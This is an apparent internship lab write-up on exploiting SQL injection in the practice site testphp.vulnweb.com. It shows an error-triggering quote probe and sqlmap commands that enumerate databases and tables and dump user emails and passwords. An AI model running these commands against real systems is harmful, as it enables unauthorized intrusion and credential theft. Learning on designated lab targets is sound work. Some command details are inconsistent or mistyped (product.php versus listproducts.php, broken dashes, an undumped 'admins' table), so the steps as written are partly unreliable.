Exploiting SQL Injection Vulnerability in TestPHP Website Using sqlmap
Author:Imran
Purpose: Educational and part of my cybersecurity internship at Cod Tech IT Solutions

Overview

This write-up details the process of identifying and exploiting an SQL injection vulnerability in the TestPHP website using sqlmap, an automated SQL injection tool. This activity was conducted purely for educational purposes as part of my internship at Cod Tech IT Solutions. The goal was to understand and demonstrate the risks associated with SQL injection vulnerabilities.

Disclaimer:
This is for educational purposes only.
Unauthorized testing of websites or systems is illegal and unethical. Always obtain proper permission before conducting any penetration testing.
TestPHP: A test website designed to help learners practice penetration testing and ethical hacking.
This write-up explains how an SQL injection vulnerability was identified and confirmed on the testphp.vulnweb.com website, specifically in the listproducts.php script, using the cat parameter.


Vulnerability Details:
Targeted URL
The vulnerability was observed in the following URL:
“http://testphp.vulnweb.com/listproducts.php?cat=1”
Steps to Identify the Vulnerability
1. Appending a single quotation mark (') to the cat parameter caused the server to return an SQL syntax error:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line X.
2. This confirmed that the server-side code did not properly sanitize user inputs before constructing SQL queries, leaving the application vulnerable to SQL injection attacks.
Observed Response
As shown in the screenshot, the server output directly exposed an error message when the following URL was entered:
“http://testphp.vulnweb.com/listproducts.php?cat=1'”
This type of error output indicates a classic SQL injection vulnerability.


Screenshot of  SQL syntax error:
![image](https://github.com/user-attachments/assets/39724082-d588-4630-95b1-3e80d948cc0f)

 
Tools Used
1. Browser: To observe error messages in response to manipulated inputs.
2. sqlmap: For automated SQL injection testing and exploitation (explained in further steps below).

Using sqlmap to Exploit the Vulnerability
Once the vulnerability was identified, I used sqlmap to automate the exploitation process.
Command Used
sqlmap -u "http://testphp.vulnweb.com/product.php?cat=1" --dbs
-u: Specifies the target URL.
--dbs: Enumerates all databases available on the server
Output:
sqlmap successfully identified the databases on the target server:
[+] information_schema
[+] acuart
Screenshot:
 ![image](https://github.com/user-attachments/assets/99c87dde-a658-4176-92db-b9441b463b38)



Extracting Data from the Database
To further explore the acuart database, I listed its tables using the following command:
Command:“sqlmap -u "http://testphp.vulnweb.com/product.php?cat=1" -D acuart–tables”
Output:
[+] categ
[+] artists  
[+] carts  
[+] featured
[+] users
Dumping the admins Table

I extracted the contents of the admins table to simulate real-world exploitation.




Screenshot:
 
 ![image](https://github.com/user-attachments/assets/592e3e37-a512-4f9c-8a15-ac5abb84e79a)
 ![image](https://github.com/user-attachments/assets/73c43082-6bfd-4e3a-9012-03aea6ed6352)





Command:“sqlmap -u "http://testphp.vulnweb.com/product.php?cat=1" -D acuart -T users --columns”
Screenshot:	 

 ![image](https://github.com/user-attachments/assets/fa85df13-b7a6-4aae-a4d2-08e456cd31dc)
 ![image](https://github.com/user-attachments/assets/90648668-60d0-4256-a1a3-180b96e2b9d4)


Dumping the Table
I extracted the contents of the users table to simulate real-world exploitation.
Command: sqlmap -u "http://testphp.vulnweb.com/product.php?cat=1" -D acuart -T users -C email,pass,uname –dump

 Screenshot:
 ![image](https://github.com/user-attachments/assets/186f1c40-1ace-4f7a-b08b-20ef93212b3d)
 ![image](https://github.com/user-attachments/assets/61226853-c0be-4b2e-8964-08600b75c7a0)


 
Found aEmail:salam@salam.com
unmae:test 
password:test

Lessons Learned:
1. SQL Injection Risks: Even a single vulnerable parameter can lead to significant data breaches.
2. Importance of Input Validation: User input should always be sanitized to prevent such attacks.
3. Using Automated Tools: Tools like sqlmap make exploitation easier but highlight the importance of securing web applications.
Conclusion:
This write-up highlights the importance of secure coding practices to prevent SQL injection vulnerabilities. Always test only on authorized platforms for educational purposes.

